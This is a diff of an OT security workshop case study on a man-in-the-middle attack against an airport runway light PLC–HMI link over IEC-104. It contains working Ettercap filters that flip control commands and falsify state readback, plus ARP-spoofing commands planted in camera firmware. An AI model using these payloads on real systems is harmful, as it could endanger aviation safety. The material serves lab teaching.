@@ -1,6 +1,6 @@
 # Aviation Runway System Cyber Security Case Study 02
 
-### [ MITM Attack on PLC–HMI IEC104 OT Control Channel ]
+### [ MITM Attack on PLC–HMI  IEC 60870-5-104 OT Control Channel ]
 
 ![](2_CaseStudy_MITM_Img/logo_mid.png)
 
@@ -172,7 +172,7 @@ During the cyber attack, the attacker needs to neutralize or evade these protect
 
 This section will introduce the tools, the analysis and the critical steps of the attacker's action of the whole attack scenario steps by steps. 
 
-#### Step-T1~T2 — Initial compromise & beaconing
+#### Step-T1 → T2 — Initial compromise & beaconing
 
 This demo section covers the attacker’s first two stages: 
 
@@ -200,11 +200,118 @@ Once deployed, the trojan runs in a low-visibility mode and periodically attempt
 
 
 
+#### Step-T3 → T4 — Data return, analysis & attack decision
+
+After the maintenance session ends and the engineer reconnects to the internet after he back to home, the implanted trojan beacons C2 and exfiltrates its captures when the attacker uses the built-in “02 — Steal File from Victim to C2-DB” function.(as shown below). 
+
+![](2_CaseStudy_MITM_Img/s_09.png)
+
+After the task finished, the uploaded PCAPs appear in the C2 file store (as shown below), and the attacker downloads them from C2 to his local computer to do the offline analysis.
+
+![](2_CaseStudy_MITM_Img/s_10.png)
+
+After got the "eavesdrop_record-07_13_09_2024.pcapng", the attacker start to analysis the packet data and find the PCAPs contained some Layer-2/3 traffic and IEC-104 frames captured while the laptop was connected to the isolated Blue-Team subnet. The key artifacts recovered during analysis included:
+
+- IEC-104 ASDU control frames (command requests from Laptop to PLC which also used by HMI to PLC).
+- PLC → Laptop state reports (measurement/quality points which may also sued by PLC to HMI).
+- IP addressing and mapping for HMI and PLC (e.g., PLC01 = `10.10.20.11`).
+- Sequence/timing patterns and APCI counters used by the IEC-104 session.
+
+**Protocol & environment constraints discovered**
+
+Based on the document and analysis the attack find careful packet inspection revealed several important defensive factors that limited simple attack options:
+
+- **PLC write whitelist** The PLC enforces an allowed-write policy white list to make sure only the HMI machine can send the PLC state change command to PLC to against false-command injection attack unless the attacker can bypass PLC access controls.
+- **Measurement-point persistence:** Light states are maintained in discrete measurement IOAs that are expected to be updated by the PLC logic; simply injecting a false data will reject by PLC directly.
+- **APCI sequence/acknowledgement counters:** IEC-104 uses Tx/Rx sequence numbers in its APCI header (send/receive indices). A naive replay of previously captured frames would fail unless these sequence counters are correctly synchronized with the live HMI↔PLC session which is nearly impossible for packet replay attack to exactly match the sequence with the old recorded packet.
+
+![](2_CaseStudy_MITM_Img/s_11.png)
+
+IEC 104 memory point change rule doc:  https://infosys.beckhoff.com/english.php?content=../content/1033/tf6500_tc3_iec60870_5_10x/984444939.html&id=
+
+Because of these constraints, the attacker concludes that neither blind false-injection nor simple replay will reliably achieve stealthy control.The only way for him is do the man in the middle attack to replace the valid data send from HMI to the PLC. 
+
+From the captured traffic the attacker locates the exact ASDU elements and IOAs involved in holding-light control as shown below: 
+
+![](2_CaseStudy_MITM_Img/s_12.png)
+
+- Control ASDU references PLC control index `11`.
+
+- The changeable IOA for the light control is `13`.
+
+- The operator’s “step up” control is represented as a specific control value (`val=02`) within the ASDU.
+
+The attacker also observes the readback pattern from PLC to HMI as shown below: 
+
+![](2_CaseStudy_MITM_Img/s_13.png)
+
+When a UP command is issued to change the light sate the PLC also get the sensor value then save to measurement IOA `1` transitions (OFF → ON) and later is read back by the HMI via a separate IEC-104 read/report sequence.
+
+Putting the pieces together, the attacker models the feasible attack strategy: to remain covert they must **intercept and alter both directions** of the IEC-104 exchange — the HMI → PLC control ASDU (to flip the command) and the PLC → HMI measurement/report ASDU (to keep the HMI display consistent). The attacker sketches the MITM logic and required targets (ASDU RCO control field, and ASDU SPI/state report fields) in an attack assumption diagram as shown below:
+
+![](2_CaseStudy_MITM_Img/s_14.png)
 
 
-  
+
+#### Step-T5 → T7 — Attack Development & Deployment
+
+After analyzing the captured IEC-104 traffic and identifying the exact ASDU fields and IOAs involved in holding-light control, the attacker elects to implement an **in-path modification** strategy :  the only practical way to remain covert is to sit between the HMI and PLC and alter messages in both directions. 
+
+- **HMI → PLC:** Modify the control request so an operator’s “step up / allow” becomes a “step down / hold” (or vice-versa).
+- **PLC → HMI:** reverse readback/state reports so the HMI continues to show normal states and does not raise warnings/alerts.
+
+As the Blue Team Subnet 2 is isolated from internet, rather than attempting a direct attack from the external Red-Team network, the adversary uses a **compromised third-party IoT camera** as the physical medium to achieve that in-path position.  Once connected to the same subnet as the light control HMI, the tampered camera positions itself to observe and influence HMI↔PLC flows by advertising misleading local network routing information (e.g., forged ARP mappings) so that traffic is routed redirect through the device. The attack flow diagram is shown below:
 
 
 
+![](2_CaseStudy_MITM_Img/s_15.png)
 
+To build the MITM payload in this attack demo, we use the Ettercap which is Linux based comprehensive suite for man in the middle attack to implement the ARP spoofing and use the Ettercap filter to analysis the port 2042 traffic and do the bit replacement. For the detailed IEC104 ASDU data sequence, you can refer to this doc: https://www.linkedin.com/pulse/python-virtual-plc-simulator-iec-60870-5-104-protocol-yuancheng-liu-bov7c
 
+The attacker wants to modify the control C_CT_TA_1 Step data if the HMI send step up [\x02] change to step down [\x01] (or vice-versa). To implement this, I built the bit Ettercap bit modification filter as shown below:
+
+```C
+if (ip.proto == TCP && ip.src = '10.10.20.11' && tcp.src == 2042 && ip.dst == '10.10.20.22') {
+    if (search(DATA.data ,"\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x02")) {
+        replace("\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x02", "\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x01");
+        msg("Modify the take off light on signal.\n");
+        exit();
+    }
+       if (search(DATA.data ,"\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x01")) {
+        replace("\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x01", "\x3c\x01\x06\x00\x0b\x00\x0d\x00\x00\x02");
+        msg("Modify the take off light off signal.\n");
+        exit();
+    }
+ }
+```
+
+When the take off holding light sensor send the light state back to the HMI, the attacker need to change the PLC response light ON state to OFF  (or vice-versa). To implement this, I build the Ettercap bit reverse filter as shown below:
+
+```c++
+if (ip.proto == TCP && ip.src = '10.10.20.22' && tcp.dst == 2042 && ip.dst == '10.10.20.11') {
+    if (search(DATA.data ,"\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x01")) {
+        replace("\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x01", "\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x00");
+        msg("reverse the take off light on signal.\n");
+        exit();
+    }
+        if (search(DATA.data ,"\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x00")) {
+        replace("\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x00", "\x01\x01\x05\x00\x0b\x00\x01\x00\x00\x01");
+        msg("reverse the take off light off signal.\n");
+        exit();
+    }
+}
+```
+
+After finished the filter, compile the filter file to a payload `*.ef` file which can load directly by Ettercap: 
+
+```bash
+etterfilter arp_mitm.filter -o mitm.ef
+```
+
+Then the attacker follow this example to package this logic malicious payload into a minimal firmware update component and integrates it into a camera image. : https://www.linkedin.com/pulse/ot-cyber-attack-workshop-case-study-06-replay-safety-surveillance-gcgxc, and add the auto run command  for ARP spoofing control with the blue team 2 subnet router IP address in the camera basic start up script: 
+
+```bash
+sudo ettercap -T -q -F mitm.ef -M ARP /10.10.20.1//
+```
+
+After finished all, the customized IoT camear is then delivered into the maintenance workflow and physically installed in the tower by the maintenance engineer who does not validate firmware or network configuration. Once active on the OT LAN, the camera begins local routing manipulation and selective ASDU substitution, acting only on narrowly defined trigger patterns (to reduce noise and lower chances of detection).
